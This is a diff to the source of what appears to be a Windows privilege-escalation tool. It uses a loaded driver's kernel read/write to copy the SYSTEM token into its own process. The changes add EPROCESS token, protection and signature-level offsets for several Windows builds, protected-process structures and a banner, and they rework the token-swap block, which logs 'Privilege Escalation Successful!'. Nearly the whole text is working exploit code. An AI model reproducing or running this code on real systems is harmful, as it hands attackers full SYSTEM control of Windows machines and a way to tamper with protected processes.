@@ -47,6 +47,44 @@ pfnNtQuerySystemInformation pNtQuerySystemInformation;
 typedef NTSTATUS(WINAPI* pRtlGetVersion)(PRTL_OSVERSIONINFOW);
 
 
+//0x1 bytes (sizeof)
+typedef struct _PS_PROTECTION
+{
+	union
+	{
+		UCHAR Level;                                                        //0x0
+		struct
+		{
+			UCHAR Type : 3;                                                   //0x0
+			UCHAR Audit : 1;                                                  //0x0
+			UCHAR Signer : 4;                                                 //0x0
+		};
+	};
+}PS_PROTECTION, * PPS_PROTECTION;
+
+typedef enum _PS_PROTECTED_SIGNER
+{
+	PsProtectedSignerNone = 0,
+	PsProtectedSignerAuthenticode = 1,
+	PsProtectedSignerCodeGen = 2,
+	PsProtectedSignerAntimalware = 3,
+	PsProtectedSignerLsa = 4,
+	PsProtectedSignerWindows = 5,
+	PsProtectedSignerWinTcb = 6,
+	PsProtectedSignerWinSystem = 7,
+	PsProtectedSignerApp = 8,
+	PsProtectedSignerMax
+} PS_PROTECTED_SIGNER;
+
+typedef enum _PS_PROTECTED_TYPE
+{
+	PsProtectedTypeNone = 0,
+	PsProtectedTypeProtectedLight = 1,
+	PsProtectedTypeProtected = 2,
+	PsProtectedTypeMax = 3
+} PS_PROTECTED_TYPE;
+
+
 static
 int
 InitFunc()
@@ -235,28 +273,67 @@ DWORD GetWindowsBuildNumber()
 
 int main()
 {
+	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
+	SetConsoleTextAttribute(hConsole, 5);  // 5 13 pink
+
 	DWORD EPROCESS_TOKEN_OFFSET = 0;
+	DWORD ProtectionOffset = 0;
+	DWORD SignatureLevelOffset = 0;
 	DWORD buildNumber = GetWindowsBuildNumber();
+
 	if (buildNumber >= 26100)
 	{
 		EPROCESS_TOKEN_OFFSET = 0x248;
+		ProtectionOffset = 0X5FA;
+		SignatureLevelOffset = 0x5F8;
 	}
 	else if (buildNumber >= 19041)
 	{
 		EPROCESS_TOKEN_OFFSET = 0x4B8;
+		ProtectionOffset = 0X87A;
+		SignatureLevelOffset = 0x878;
 	}
 	else if (buildNumber >= 18362)
 	{
 		EPROCESS_TOKEN_OFFSET = 0x360;
+		ProtectionOffset = 0X6FA;
+		SignatureLevelOffset = 0x6F8;
+	}
+	else if (buildNumber >= 15063)
+	{
+		EPROCESS_TOKEN_OFFSET = 0x358;
+		ProtectionOffset = 0X6CA;
+		SignatureLevelOffset = 0x6C8;
 	}
 	else if (buildNumber >= 14393)
 	{
 		EPROCESS_TOKEN_OFFSET = 0x358;
+		ProtectionOffset = 0X6C2;
+		SignatureLevelOffset = 0x6C0;
 	}
 	else
 	{
 		return -1;
 	}
+
+	constexpr std::string_view art = R"(
+
+$$$$$$$\   $$\                                                   $$$$$$$$\          $$\  $$\ 
+$$  __$$\  \__|                                                  $$  _____|         \__| $$ |
+$$ |  $$ | $$\  $$$$$$$\    $$$$$$\    $$$$$$\   $$\   $$\       $$ |   $$\    $$\  $$\  $$ |
+$$$$$$$\ | $$ | $$  __$$\   \____$$\  $$  __$$\  $$ |  $$ |      $$$$$$ \$$\  $$  | $$ | $$ |
+$$  __$$\  $$ | $$ |  $$ |  $$$$$$$ | $$ |  \__| $$ |  $$ |      $$  ___ \$$\$$  /  $$ | $$ |
+$$ |  $$ | $$ | $$ |  $$ | $$  __$$ | $$ |       $$ |  $$ |      $$ |     \$$$  /   $$ | $$ |
+$$$$$$$  | $$ | $$ |  $$ | \$$$$$$$ | $$ |       \$$$$$$$ |      $$$$$$$$$ \$  /    $$ | $$ |
+\_______/  \__| \__|  \__|  \_______| \__|        \____$$ |      \_________ \_/     \__| \__|
+                                                 $$\   $$ |                              
+                                                 \$$$$$$  |                              
+                                                  \______/                               
+	)";
+
+	LOG(art);
+
+	SetConsoleTextAttribute(hConsole, 7);
 
 	if (InitFunc() != 0)
 	{
@@ -295,7 +372,7 @@ int main()
 		return nResult;
 	}
 
-
+	SetConsoleTextAttribute(hConsole, 13);
 	system("whoami");
 	LOG("----------------------------------Fxxking System---------------------------------");
 
@@ -329,35 +406,37 @@ int main()
 		return 1;
 	}
 
-	CorMem corMem{ deviceName };
-
-	ULONG64 systemToken = 0;
-	if (!corMem.KernelRead((PVOID)(SystemProcess + EPROCESS_TOKEN_OFFSET), &systemToken, sizeof(systemToken)))
+	do 
 	{
-		LOG("[-] KernelRead System Token address : " << std::hex << (SystemProcess + EPROCESS_TOKEN_OFFSET) << std::dec);
-		return 1;
-	}
-	std::cout << "Read Address = " << std::hex
-		<< (SystemProcess + EPROCESS_TOKEN_OFFSET) << " value : " << systemToken << std::dec << std::endl;
+		CorMem corMem{ deviceName };
 
-	if (!corMem.KernelWrite(reinterpret_cast<PVOID>(CurrentProcess + EPROCESS_TOKEN_OFFSET),
-							&systemToken,
-							sizeof(ULONG64)))
-	{
-		std::cout << "[-] KernelWrite Current Token failed" << std::endl;
-		return 1;
-	}
+		ULONG64 systemToken = 0;
+		if (!corMem.KernelRead((PVOID)(SystemProcess + EPROCESS_TOKEN_OFFSET), &systemToken, sizeof(systemToken)))
+		{
+			LOG("[-] KernelRead System Token address : " << std::hex << (SystemProcess + EPROCESS_TOKEN_OFFSET) << std::dec);
+			break;
+		}
+		/*std::cout << "Read Address = " << std::hex
+			<< (SystemProcess + EPROCESS_TOKEN_OFFSET) << " value : " << systemToken << std::dec << std::endl;*/
 
-	LOG("---------------------------------------------------------------------------------");
-	LOG("[+] Privilege Escalation Successful!");
+		if (!corMem.KernelWrite(reinterpret_cast<PVOID>(CurrentProcess + EPROCESS_TOKEN_OFFSET),
+								&systemToken,
+								sizeof(ULONG64)))
+		{
+			std::cout << "[-] KernelWrite Current Token failed" << std::endl;
+			break;
+		}
 
-	system("whoami");
-	LOG("-------------------------------------End-----------------------------------------");
+		LOG("---------------------------------------------------------------------------------");
+		LOG("[+] Privilege Escalation Successful!");
+
+		system("whoami");
+		LOG("-------------------------------------End-----------------------------------------");
+		SetConsoleTextAttribute(hConsole, 7);
+		system("pause");
+	} while (FALSE);
 
 	driverService.StopAndUnregister();
-
-	system("pause");
-
 
 	return 0;
 }
